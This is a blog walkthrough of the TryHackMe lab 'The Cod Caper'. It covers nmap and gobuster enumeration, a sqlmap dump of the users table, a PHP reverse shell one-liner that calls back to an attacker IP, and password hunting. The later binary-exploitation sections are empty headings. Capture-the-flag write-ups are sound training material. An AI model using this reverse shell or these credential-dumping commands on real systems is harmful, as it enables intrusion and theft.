---
title: Try Hack Me The Cod Caper
date: 2021-09-13T12:40:13+05:30
lastmod: 2021-09-13T12:40:13+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
featureimage: img/tcc.gif
simg: /img/tcc.gif

categories:
  - TryHackMe
tags:
  - tryhackme

draft: false
description: "TryHackMe The Cod Caper walkthrough with step-by-step solutions — enumeration, exploitation, and privilege escalation on the The Cod Caper challenge room."
---

## OverView

|||
|---|---|
| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|The Cod Caper|![logo](https://tryhackme-images.s3.amazonaws.com/room-icons/282c55307eada4ad18a0b06e4d65ff34.jpeg)|
| <b> The Cod Caper [FREE] </b>| [The Cod Caper](https://tryhackme.com/room/thecodcaper)|

## 1: Intro

Hello there my name is Pingu. I've come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn't eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server. As all penguins are natural experts in penetration testing, I figured I could get the key myself! Unfortunately he banned every IP from Antarctica, so I am unable to do anything to the server. Therefore I call upon you my dear ally to help me get my fish back! Naturally I'll be guiding you through the process.

Note: This room expects some basic pen testing knowledge, as I will not be going over every tool in detail that is used. While you can just use the room to follow through, some interest or experiencing in assembly is highly recommended

---

## 02: Host Enumeration

* NMAP
  
     ```bash
     Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-13 12:56 IST
     Nmap scan report for 10.10.70.241
     Host is up (0.17s latency).
     Not shown: 998 closed ports
     PORT   STATE SERVICE VERSION
     22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
     | ssh-hostkey: 
     |   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
     |   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
     |_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
     80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
     |_http-server-header: Apache/2.4.18 (Ubuntu)
     |_http-title: Apache2 Ubuntu Default Page: It works
     Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 14.41 seconds
     ```

### 02-Flags

|Answer the questions below| ans|
|---|---|
|How many ports are open on the target machine?|`2`|
|What is the http-title of the web server?|`ans on nmap scan`|
|What version is the ssh service?|`ans on nmap scan`|
|What is the version of the web server?|`ans on nmap scan`|

------

## 03: Web Enumeration

* gubuster
  
  `gobuster dir -u http://10.10.70.241 -w big.txt -o root.gobuster -x php,txt,html`

---

## 04: Web Exploitation

* Recommended Tool: `sqlmap`

1. Capture the req packet with `burp-suite` and save it as `login.req`
2. run sqlmap `sqlmap -r login.req`

* find usename:password
  
  `sqlmap -r login.req --batch -D users -T users --dump`

---

## 05: Command Execution

* PHP rev shell
  
  `php -r '$sock=fsockopen("10.17.4.40",9001);exec("/bin/sh -i <&3 >&3 2>&3");'`

### 5.1: How many files are in the current directory?

`ls -l /var/www/html` 

### 5.2: Do I still have an account

check `ls -l /home` if pingu exists then ans is yes

### 5.3: What is my ssh password?

`find / -user “www-data” -name “*” 2>/dev/null`

`cat /var/hidden/pass` #password here

---

## 06:  LinEnum

run `linenum` you'll find the ans in `[-] SUID files:` first one is the ans.

---

## 07: pwndbg

---

## 08: Binary-Exploitaion: Manually

---

## 09: Binary Exploitation: The pwntools way

---

## 10: Finishing the job

---

## Task 11: Thank you!